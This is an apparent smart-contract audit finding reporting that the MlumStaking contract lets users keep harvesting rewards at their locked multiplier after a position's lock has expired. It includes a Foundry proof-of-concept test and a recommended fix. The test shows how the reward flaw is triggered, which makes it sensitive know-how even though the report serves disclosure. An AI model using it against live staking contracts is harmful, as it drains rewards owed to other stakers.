# Users can harvest expired positions and receive the full amount of rewards with their funds being already unlocked

## Summary
Users can still harvest rewards after the position expiration. After position expiration user can harvest full rewards as if their position was still locked for staking.

## Vulnerability Detail
When a user creates a position using the `createPosition` function, they can specify a lock duration. A longer lock duration results in a higher multiplier and greater rewards. However, because there is no check in `_harvestPosition` to ensure that the position has not expired, or any mechanism to reduce users rewards if their position is expired (`amountWithMultiplier` would stay the same after expiration and this part of the problem), users are able to harvest their rewards as usual after the position expires. Additionally, they still have the ability to withdraw their funds at any time because their position has technically ended, and there are no restrictions on withdrawing funds.

## Impact
Users can receive rewards without an incentive to lock tokens inside the contract after expiration date.

## PoC

Insert into MlumStaking.t.sol

```solidity
  function testHarvestForExpiredPosition() public {
        _rewardToken.mint(address(_pool), 50e18);
        createPosition(ALICE, 1 ether);
        createPosition(BOB, 1 ether, 30 days);
        createPosition(makeAddr("RANDOM USER"), 1 ether, 30 days);
        _rewardToken.mint(address(_pool), 100e18);
        MlumStaking.StakingPosition memory position = _pool.getStakingPosition(
            2
        );
        uint amountWithMultiplier = position.amountWithMultiplier;
        vm.warp(block.timestamp + 30 days);
        harvestPosition(BOB, 2);
        _rewardToken.mint(address(_pool), 100e18);
        vm.warp(block.timestamp + 60 days);
        harvestPosition(BOB, 2); // BUG IS HERE, user can harvest rewards even after position is expired with the old amountWithMultiplier (rewards rate)
        position = _pool.getStakingPosition(2);
        uint amountWithMultiplierAfterExpiration = position
            .amountWithMultiplier;
        assertEq(amountWithMultiplierAfterExpiration, amountWithMultiplier); // PROOF, user would have the same amount multiplier and therefore the same amount of rewards
    }

    function harvestPosition(address account, uint tokenId) internal {
        vm.startPrank(account);
        uint balanceBefore = _rewardToken.balanceOf(account);
        _pool.harvestPosition(tokenId);
        uint balanceAfter = _rewardToken.balanceOf(account);
        // console.log(account);
        console.log("Received  ", balanceAfter - balanceBefore);
        vm.stopPrank();
    }
    function createPosition(
        address account,
        uint amount,
        uint duration
    ) internal {
        _stakingToken.mint(account, amount);
        vm.startPrank(account);
        _stakingToken.approve(address(_pool), amount);
        _pool.createPosition(amount, duration);
        vm.stopPrank();
    }
    function createPosition(address account, uint amount) internal {
        _stakingToken.mint(account, amount);
        vm.startPrank(account);
        _stakingToken.approve(address(_pool), amount);
        _pool.createPosition(amount, 0);
        vm.stopPrank();
    }
```

## Tool used

Foundry.

## Recommendation

Remove ability to harvest rewards when lock duration is expired or make them significantly smaller.
